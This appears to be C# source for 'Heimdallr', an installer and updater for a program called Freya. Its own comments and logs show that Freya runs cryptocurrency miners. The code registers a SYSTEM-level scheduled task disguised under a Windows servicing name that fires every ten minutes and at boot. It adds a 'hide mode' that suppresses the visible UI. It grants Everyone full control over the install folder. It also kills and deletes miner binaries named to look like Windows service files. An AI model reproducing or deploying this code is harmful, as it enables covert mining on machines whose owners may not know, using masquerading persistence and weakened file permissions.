using Freya;
using FSLib.App.SimpleUpdater;
using FSLib.App.SimpleUpdater.Defination;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.ServiceProcess;
using System.Diagnostics;
using Freya.Service;
using System.Reflection;
using System.IO;
using Microsoft.Win32.TaskScheduler;
using Microsoft.Win32;
using ZetaIpc.Runtime.Client;
using System.Threading;
using System.Security.AccessControl;

namespace Heimdallr
{
    class Program
    {
        static LogWriter logger = new LogWriter(true); //disable text logger

        static void Main(string[] args)
        {
            //訂閱載入內崁DLL資源
            AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;

            //Clean up dummy files
            //DeleteFile(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "\\LogsFreya.log");

            if (args != null && args.Length > 0)
            {
                // 確保只有一個執行
                FFunc.SingleInstance();
                logger.WriteLine($"[H] Heimdallr get command: {args[0].ToString()}");
                switch (args[0].ToString())
                {
                    case "update":
                        RunUpdater();
                        break;
                    case "forceupdate":
                        RunUpdater(forceupdate: true);
                        break;
                    case "install":
                        InstallFreya(DoNotKillFreya: true); // Install Task, Install and start service.
                        break;
                    case "uninstall":
                        StopService();
                        UninstallService();
                        KillProcess();
                        break;
                    case "reinstall":
                        StopService();
                        UninstallService();
                        InstallFreya(DoNotKillFreya: true); // Install Task, Install and start service.
                        break;
                    case "installTask":
                        InstallTask(); // Install Task.
                        break;
                    case "stopService":
                        StopService();
                        break;
                    case "startService":
                        StartService();
                        break;
                    default:
                        Console.ForegroundColor = ConsoleColor.Red;
                        logger.WriteLine("[H] Command not recognized.");
                        break;
                }
            }
            else
            {
                logger.WriteLine($"[H] Heimdallr get no command, InstallFreya.");
                InstallFreya(); // Install, start service, start UI
            }
            Console.ResetColor();
            //Console.ReadLine(); // For debug only, remove when production
        }

        private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            string resourceName = "Heimdallr." + new AssemblyName(args.Name).Name + ".dll";
            using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            {
                byte[] assemblyData = new byte[stream.Length];
                stream.Read(assemblyData, 0, assemblyData.Length);
                return Assembly.Load(assemblyData);
            }
        }

        private static void RunUpdater(bool forceupdate = false)
        {
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            logger.WriteLine("[H] Heimdallr is Starting Updater");

            var freyaUpdater = Updater.CreateUpdaterInstance(
            new UpdateServerInfo[]
            {
                    //new UpdateServerInfo("http://angeloeyez.github.io/freya/{0}", "update.xml"),
                    //new UpdateServerInfo("http://freya.scienceontheweb.net/{0}", "update_c.xml"),
                    new UpdateServerInfo("http://10.57.208.65/freya/{0}", "update_c.xml"),
                    new UpdateServerInfo("http://10.57.208.65/freya/{0}", "update.xml")

            });

            freyaUpdater.Context.EnableEmbedDialog = false; // 禁用內建dialog
            freyaUpdater.Context.ForceUpdate = false;  //設定false才會進入 UpdatesFound event，打包時，"不提示直接自動啟動升級"不可勾
            freyaUpdater.Context.AutoKillProcesses = true;
            //freyaUpdater.Context.HiddenUI = true;

            //取得Freya.exe Version，以這個Version為主來更新，若無法取得則用原本的
            Version freyaUIVersion = Assembly.ReflectionOnlyLoadFrom(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "\\Freya.exe").GetName().Version;
            if (freyaUIVersion != null)
                freyaUpdater.Context.CurrentVersion = freyaUIVersion;

            if (forceupdate)
                freyaUpdater.Context.CurrentVersion = new Version(1, 1, 1, 1);

            freyaUpdater.Error += (s, e) =>
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                logger.WriteLine("[H] Update Error：" + freyaUpdater.Context.Exception.Message);
                Console.WriteLine(freyaUpdater.Context.UpdateInfoTextContent);
                Console.ResetColor();
                Environment.Exit(0);
            };

            freyaUpdater.NoUpdatesFound += (s, e) =>
            {
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                logger.WriteLine(string.Format("[H] Local = Server Version： {0} = {1}", freyaUpdater.Context.CurrentVersion, freyaUpdater.Context.UpdateInfo.AppVersion));
                logger.WriteLine("[H] No New Version!");
                Console.ResetColor();
                Environment.Exit(0);
            };

            freyaUpdater.MinmumVersionRequired += (s, e) =>
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                logger.WriteLine(string.Format("[H] Local / Server Version： {0} / {1}", freyaUpdater.Context.CurrentVersion, freyaUpdater.Context.UpdateInfo.AppVersion));
                logger.WriteLine("[H] Current Version is too low for update!");
                Console.ResetColor();
                Environment.Exit(0);
            };

            freyaUpdater.UpdatesFound += new EventHandler(updater_UpdatesFound);

            //logger.WriteLine("[H] Getting " + freyaUpdater.Context.UpdateInfoFileUrl);
            freyaUpdater.BeginCheckUpdateInProcess();
            Console.ResetColor();
            Console.ReadLine(); //必須保留，不加updater還來不及跑就結束了，在訂閱事件裡面加上 Environment.Exit(0);作結束
        }

        private static void updater_UpdatesFound(object sender, EventArgs e)
        {
            var freyaUpdater = Updater.Instance;
            Console.ForegroundColor = ConsoleColor.Yellow;
            logger.WriteLine(string.Format("[H] Local --> Server Version： {0} --> {1}", freyaUpdater.Context.CurrentVersion, freyaUpdater.Context.UpdateInfo.AppVersion));
            logger.WriteLine("[H] New Version Found：" + freyaUpdater.Context.UpdateInfo.AppVersion);
            Console.ResetColor();

            // Stop and Uninstall Service
            StopService();
            UninstallService();

            // Uninstall Registry keys (Startup)
            try
            {
                RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (key != null)
                    key.DeleteValue("FreyaUI");
                RegistryKey key1 = Registry.LocalMachine.OpenSubKey("Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (key1 != null)
                    key1.DeleteValue("FreyaUI");
                logger.WriteLine("[H] Registry key deleted");
            }
            catch (Exception) { }


            if (!FFunc.HasRight(FConstants.FeatureByte.Hide))
            {
                // Deploy FreyaUI WatchDog
                int servicePort = (FFunc.GetRegKey("FreyaUIPort") == null) ? 10000 : (int)FFunc.GetRegKey("FreyaUIPort");
                logger.WriteLine($"[H] Deploying Watchdog for FreyaUI... (UIPort={servicePort})");
                IpcClient radioClient = new IpcClient();
                radioClient.Initialize(servicePort);

                string result = radioClient.Send("{ \"Type\": \"CMD\", \"Data\": \"StartUpdateProcess\", \"Data2\": \"\",\"Loglevel\": 0}");
                Thread.Sleep(1000);
                logger.WriteLine("[H]       UI feedback: " + result);
                //if (radioClient.Send("{ \"Type\": \"CMD\", \"Data\": \"DeployWacthDog\", \"Data2\": \"\",\"Loglevel\": 0}") != "WatchDogDeployed")
                //    Console.WriteLine(radioClient.Send("{ \"Type\": \"CMD\", \"Data\": \"DeployWacthDog\", \"Data2\": \"\",\"Loglevel\": 0}"));

                Thread.Sleep(1000);
            }
            else
                logger.WriteLine("[H] Hide mode, no watchdog.");

            KillProcess();

            Console.ForegroundColor = ConsoleColor.DarkYellow;

            logger.WriteLine("[H] Starting update");
            logger.WriteLine("[H]   Check Service exist:" + ServiceExists(FConstants.ServiceName).ToString());
            freyaUpdater.StartExternalUpdater();
            logger.WriteLine("[H]   Updater thread started in background. Terminate Heimdallr.");
            Console.ResetColor();
        }

        private static void InstallFreya(bool DoNotKillFreya = false)
        {
            ///
            /// [Clean up old miners before installation]
            KillProcess(DoNotKillFreya);
            DeleteFile(@"C:\Windows\SysWOW64\windowsserviceagent.exe");
            DeleteFile(@"C:\Windows\windowsserviceagent.exe");
            DeleteFile(@"C:\Intel\windowsserviceagent.exe");

            string[] workerRuntimeName = FFunc.GetWorkerRuntimeName();
            for (int n = 0; n < workerRuntimeName.Length; n++)
                DeleteFile(FConstants.WorkFilePath + "\\" + workerRuntimeName[n]);

            ///
            /// 調整 registry
            // FFunc.SetRegKey("FeatureByte", Convert.ToInt32(FConstants.FeatureByte.Hide));

            ///
            /// [開機自動啟動 FreyaUI]
            try
            {   //Hide Mode不自動啟動FreyaUI，刪除registry key 
                string FreyaDirectory = (string)FFunc.GetRegKey("FreyaDirectory");
                if ((FreyaDirectory == null ||                                                                  // OR 全新安裝
                    !FreyaDirectory.Equals(System.AppDomain.CurrentDomain.SetupInformation.ApplicationBase) ||  // OR 安裝位置不同，就取消hide mode (form1裡面取消) 
                    !FFunc.HasRight(FConstants.FeatureByte.Hide)) &&                                            // OR 不是hide mode
                    !System.AppDomain.CurrentDomain.SetupInformation.ApplicationBase.Equals(@"C:\Windows\Freya\"))   // AND不是在windows目錄
                {
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "FreyaUI", "\"" + System.AppDomain.CurrentDomain.SetupInformation.ApplicationBase + "Freya.exe\" minimized");
                    //Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", "FreyaUI", "\"" + System.AppDomain.CurrentDomain.SetupInformation.ApplicationBase + "Freya.exe\" minimized");
                    FFunc.DelRight(FConstants.FeatureByte.Hide);
                    logger.WriteLine("[H] Start up Registry key added, remove hide featurebyte");
                }
                else
                {
                    try
                    {
                        RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        if (key != null)
                            key.DeleteValue("FreyaUI");
                        RegistryKey key1 = Registry.LocalMachine.OpenSubKey("Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        if (key1 != null)
                            key1.DeleteValue("FreyaUI");
                        
                    }
                    catch (Exception) { }
                    FFunc.AddRight(FConstants.FeatureByte.Hide);
                    logger.WriteLine("[H] Start up Registry key deleted, add hide featurebyte");
                }

            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                logger.WriteLine("[H] Adding registry Exception: " + ex.Message.ToString());
                Console.ResetColor();
            }

            //調整目錄下檔案權限
            string folder = System.AppDomain.CurrentDomain.SetupInformation.ApplicationBase;
            string account = "Everyone";
            DirectorySecurity ds = Directory.GetAccessControl(folder, AccessControlSections.All);
            ds.AddAccessRule(new FileSystemAccessRule(account,
                                   FileSystemRights.FullControl,
            InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                   PropagationFlags.None,
                                   AccessControlType.Allow));
            Directory.SetAccessControl(folder, ds);

            InstallTask();
            InstallService();
            StartService();
        }

        private static void InstallTask()
        {
            try
            {
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                logger.WriteLine("[H] Check Task...");
                using (TaskService ts = new TaskService())
                {
                    const string taskName = @"\Microsoft\Windows\Servicing\ServiceAssistantCheck";
                    Task t = ts.GetTask(taskName);
                    if (t == null)
                    {
                        logger.WriteLine("[H]   Task not found, create new...");
                    }
                    else
                    {
                        logger.WriteLine("[H]   Task found, rewrite new settings...");
                        ts.RootFolder.DeleteTask(taskName);
                    }

                    // Create a new task definition and assign properties
                    TaskDefinition td = ts.NewTask();

                    td.RegistrationInfo.Description = "Check service status change.";
                    //td.Principal.LogonType = TaskLogonType.ServiceAccount;
                    td.Principal.RunLevel = TaskRunLevel.Highest;
                    td.Settings.MultipleInstances = TaskInstancesPolicy.IgnoreNew;
                    td.Settings.StartWhenAvailable = true;
                    td.Settings.WakeToRun = true;
                    td.Settings.RestartCount = 5;
                    td.Settings.RestartInterval = TimeSpan.FromSeconds(100);

                    // Add a trigger that will fire every 10 minutes
                    TimeTrigger tt = td.Triggers.Add(new TimeTrigger());
                    tt.Repetition.Interval = TimeSpan.FromMinutes(10);

                    // Create trigger that fires 5 minutes after the system starts.
                    BootTrigger bt = td.Triggers.Add(new BootTrigger());
                    bt.Delay = TimeSpan.FromMinutes(5);

                    // Add an action that will launch Notepad whenever the trigger fires
                    td.Actions.Add(new ExecAction(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, "update", null));

                    // Register the task in the root folder
                    ts.RootFolder.RegisterTaskDefinition(taskName, td, TaskCreation.CreateOrUpdate, "SYSTEM", null, TaskLogonType.ServiceAccount);

                    Console.ForegroundColor = ConsoleColor.Cyan;
                    logger.WriteLine("[H]   Task Scheduler ... Done.");
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                logger.WriteLine("[H] Task scheduler operation exception: " + ex.ToString());
            }
            Console.ResetColor();
        }


        private static void InstallService()
        {
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            if (!ServiceExists(FConstants.ServiceName))
            {
                logger.Write("[H] Installing Service...");
                ProxyServiceInstaller installer = new ProxyServiceInstaller();
                Console.ForegroundColor = ConsoleColor.DarkGray;
                installer.Install(false, new string[] { });
                Console.ForegroundColor = ConsoleColor.Magenta;
                logger.Write("...done", true);
            }
            else
                logger.WriteLine("[H] Service already exist!");
            Console.ResetColor();
        }

        private static bool ServiceExists(string serviceName)
        {
            ServiceController[] services = ServiceController.GetServices();
            return services.FirstOrDefault(s => s.ServiceName == serviceName) != null;
        }

        private static void StartService(string serviceName = FConstants.ServiceName)
        {
            if (ServiceExists(serviceName))
            {
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                logger.WriteLine("[H] Starting Service...");
                ServiceController serviceContoller = new ServiceController(serviceName);
                if (serviceContoller.Status != ServiceControllerStatus.Running && serviceContoller.Status != ServiceControllerStatus.StartPending)
                    serviceContoller.Start();
                Console.ForegroundColor = ConsoleColor.Magenta;
                //logger.Write("...done", true);
                Console.ResetColor();
            }
        }

        private static void StopService(string serviceName = FConstants.ServiceName)
        {
            try
            {
                if (ServiceExists(serviceName))
                {
                    Console.ForegroundColor = ConsoleColor.DarkMagenta;
                    logger.WriteLine("[H] Stopping Service...");
                    ServiceController serviceContoller = new ServiceController(serviceName);
                    if (serviceContoller.Status != ServiceControllerStatus.Stopped && serviceContoller.Status != ServiceControllerStatus.StopPending)
                        serviceContoller.Stop();
                    Console.ForegroundColor = ConsoleColor.Magenta;
                    //logger.Write("...done", true);
                    Console.ResetColor();
                }
            }
            catch { }
        }

        private static void UninstallService()
        {
            try
            {
                Console.ForegroundColor = ConsoleColor.DarkMagenta;
                if (ServiceExists(FConstants.ServiceName))
                {
                    logger.WriteLine("[H] UnInstalling Service...");
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    ProxyServiceInstaller installer = new ProxyServiceInstaller();
                    installer.Install(true, new string[] { });
                    Console.ForegroundColor = ConsoleColor.Magenta;
                    //logger.Write("...done", true);
                }
                else
                    logger.WriteLine("[H] Service not exist!");
                Console.ResetColor();
            }
            catch { }
        }

        private static void DeleteFile(string f)
        {
            try
            {
                if (System.IO.File.Exists(f))
                    System.IO.File.Delete(f);
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                logger.WriteLine("\n[H] Clean up miner exception. Error Deleting " + f + "\n" + ex.Message.ToString());
                Console.ResetColor();
            }
        }

        private static void KillProcess(bool DoNotKillFreya = false)
        {
            // Kill FreyaUI / Miner
            Process[] procs = Process.GetProcesses();
            string[] workerRuntimeName = FFunc.GetWorkerRuntimeName();
            foreach (Process p in procs)
            {
                if (p.ProcessName == (DoNotKillFreya ? "" : "Freya") || p.ProcessName == "Freya.Service" ||
                    p.ProcessName == workerRuntimeName[0] || p.ProcessName == workerRuntimeName[1] || p.ProcessName == workerRuntimeName[2])
                {
                    try
                    {
                        logger.Write($"[H] Killing process:[{p.Id}] {p.ProcessName} ");
                        p.Kill();
                        logger.Write("...done", true);
                    }
                    catch (Exception ex)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        logger.WriteLine($" -> {ex.Message}");
                        Console.ResetColor();
                    }
                }
            }

        }

    }

}
